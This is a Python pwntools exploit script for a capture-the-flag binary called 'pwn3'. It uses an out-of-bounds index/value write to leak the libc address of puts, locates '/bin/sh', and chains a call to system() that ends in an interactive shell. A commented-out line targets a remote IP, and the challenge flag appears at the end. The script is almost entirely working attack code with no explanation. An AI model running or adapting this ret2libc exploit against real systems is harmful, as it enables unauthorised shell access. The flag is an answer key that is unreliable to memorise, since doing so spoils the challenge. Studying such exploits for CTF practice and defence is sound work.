#!/usr/bin/env python
from pwn import *
from struct import unpack
from ctypes import c_int
# context(arch='i386', os='linux', log_level='debug')

libc = ELF('libc.so')
elf = ELF('pwn3')

pr = process('./pwn3') 
# pr = remote('114.55.40.165', 8000)

payload = [
	0x08048763,
	1, 2, 3, 4, 5, 6, 7, 8, 9
	]

def chg(x):
	assert(x & 3 == 0)
	tmp = c_int(0x80000000 | (x >> 2))
	return str(tmp.value)

pr.recvuntil("Enter your name \n")
pr.sendline('aaa')

plt_puts = elf.symbols['puts']
print 'plt_puts= ' + hex(plt_puts)
got_puts = elf.got['puts']
print 'got_puts= ' + hex(got_puts)
vulfun_addr = 0x080485E7 
print 'vulfun= ' + hex(vulfun_addr)

sysaddr = elf.symbols['system']  

payload[0] = plt_puts
payload[1] = vulfun_addr
payload[2] = got_puts
for i in range(10):
	pr.recvuntil("enter index\n")
	pr.sendline(chg(56+i*4))
	pr.recvuntil("enter value\n")
	pr.sendline(str(payload[i]))

text = pr.recvuntil('your input\n')
text = pr.recvuntil('\n')
text = text.split(" ")
print repr(text[10])
puts_addr = u32(text[10][:4])
print 'puts_addr=' + hex(puts_addr)

binsh_addr = puts_addr - (libc.symbols['puts'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)

payload[0] = sysaddr
payload[1] = vulfun_addr
payload[2] = str(c_int(binsh_addr).value)
# print payload[2]
for i in range(10):
	pr.recvuntil("enter index\n")
	pr.sendline(chg(56+i*4))
	pr.recvuntil("enter value\n")
	pr.sendline(str(payload[i]))

pr.recvuntil('your input\n')
pr.interactive()

# FLAG{never_g1ve_up}